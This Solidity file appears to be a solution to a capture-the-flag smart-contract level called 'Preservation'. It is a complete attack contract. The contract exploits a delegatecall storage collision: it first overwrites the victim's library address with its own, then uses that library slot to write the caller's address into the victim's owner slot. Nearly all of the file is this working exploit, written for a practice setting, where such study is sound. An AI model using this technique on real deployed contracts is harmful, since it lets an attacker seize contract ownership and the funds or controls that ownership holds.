// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/16-IPreservation.sol";

contract PreservationAttack {
    address private slot0;
    address private slot1;
    uint256 private slot2;
    IPreservation public immutable victimPreservation;

    constructor(IPreservation victimPreservation_) {
        victimPreservation = victimPreservation_;
    }

    function setTime(uint256 _time) public {
        slot2 = _time;
    }

    function attack() external {
        victimPreservation.setFirstTime(uint256(uint160(address(this))));

        require(
            address(this) == victimPreservation.timeZone1Library(),
            "Preservation: Wrong address"
        );

        victimPreservation.setFirstTime(uint256(uint160(msg.sender)));

        require(
            msg.sender == victimPreservation.owner(),
            "Preservation: Attack failed"
        );
    }
}
